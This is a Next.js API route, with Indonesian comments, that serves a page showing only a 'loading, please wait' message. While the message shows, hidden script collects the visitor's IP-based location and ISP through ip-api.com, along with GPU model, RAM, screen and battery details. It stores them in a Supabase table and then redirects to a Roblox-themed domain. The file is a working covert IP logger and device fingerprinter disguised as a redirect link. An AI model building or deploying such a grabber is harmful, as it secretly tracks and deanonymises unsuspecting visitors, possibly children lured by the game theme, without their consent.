import { headers } from 'next/headers'
import { supabase } from '@/lib/supabase'

// 1. Endpoint POST: Menerima data lengkap dari client-side JavaScript dan menyimpannya ke Supabase
export async function POST(request) {
  try {
    const body = await request.json()

    await supabase.from('visitors').insert([
      {
        ip_address: body.ip || '127.0.0.1',
        city: decodeURIComponent(body.city || 'Unknown'),
        country: body.country || 'Unknown',
        isp: body.isp || 'Unknown',
        zip: body.zip || '00000',
        user_agent: body.userAgent || 'Unknown',
        referer: body.referer || 'Direct',
        device_model: body.deviceModel || 'Unknown',
        screen_info: body.screenInfo || 'Unknown',
        ram: body.ram || 'Unknown',
        gpu: body.gpu || 'Unknown',
        battery: body.battery || 'Unknown'
      }
    ])

    return Response.json({ success: true })
  } catch (err) {
    return Response.json({ success: false, error: err.message }, { status: 500 })
  }
}

// 2. Endpoint GET: Dipanggil saat user membuka /api/track
// Menampilkan HTML interseptor untuk membaca Hardware lalu Redirect
export async function GET(request) {
  const headersList = await headers()
  const forwardedFor = headersList.get('x-forwarded-for')
  const clientIp = forwardedFor ? forwardedFor.split(',')[0].trim() : ''
  const userAgent = headersList.get('user-agent') || ''
  const referer = headersList.get('referer') || 'Direct'

  // HTML yang dikirim langsung ke browser untuk membaca hardware
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="id">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Redirecting...</title>
      <style>
        body {
          font-family: system-ui, -apple-system, sans-serif;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          margin: 0;
          background-color: #f9fafb;
          color: #111827;
        }
        .loader {
          text-align: center;
        }
      </style>
    </head>
    <body>
      <div class="loader">
        <p>Memuat halaman, harap tunggu...</p>
      </div>

      <script>
        async function trackAndRedirect() {
          const clientIp = "${clientIp}";
          const userAgent = ${JSON.stringify(userAgent)};
          const referer = ${JSON.stringify(referer)};
          const targetUrl = "https://roblox-cdn-finder.vercel.app/";

          try {
            // A. Ambil Detail IP & Lokasi via ip-api
            let ipData = { city: 'Unknown', country: 'Unknown', isp: 'Unknown', zip: '00000', query: clientIp };
            try {
              const ipRes = await fetch('http://ip-api.com/json/' + (clientIp && clientIp !== '127.0.0.1' ? clientIp : '') + '?fields=status,country,city,zip,isp,query');
              const resJson = await ipRes.json();
              if (resJson.status === 'success') {
                ipData = resJson;
              }
            } catch (e) {}

            // B. Deteksi Layar & Orientasi
            const screenInfo = window.screen.width + 'x' + window.screen.height + ' (' + (screen.orientation ? screen.orientation.type : 'unknown') + ')';

            // C. Deteksi RAM
            const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not Supported';

            // D. Deteksi GPU (Kartu Grafis)
            let gpu = 'Unknown';
            try {
              const canvas = document.createElement('canvas');
              const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
              if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                  gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
              }
            } catch (e) {}

            // E. Deteksi Daya Baterai
            let batteryStatus = 'Not Supported';
            if (navigator.getBattery) {
              try {
                const battery = await navigator.getBattery();
                batteryStatus = Math.round(battery.level * 100) + '% (' + (battery.charging ? 'Charging' : 'Discharging') + ')';
              } catch (e) {}
            }

            // F. Kirim Data ke API POST
            await fetch('/api/track', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                ip: ipData.query || clientIp || '127.0.0.1',
                city: ipData.city,
                country: ipData.country,
                isp: ipData.isp,
                zip: ipData.zip,
                userAgent: userAgent,
                referer: referer,
                deviceModel: navigator.platform || 'Unknown',
                screenInfo: screenInfo,
                ram: ram,
                gpu: gpu,
                battery: batteryStatus
              })
            });
          } catch (err) {
            console.error(err);
          } finally {
            // G. Otomatis Redirect ke reiya.qzz.io
            window.location.href = targetUrl;
          }
        }

        trackAndRedirect();
      </script>
    </body>
    </html>
  `

  return new Response(htmlContent, {
    headers: { 'Content-Type': 'text/html' }
  })
}
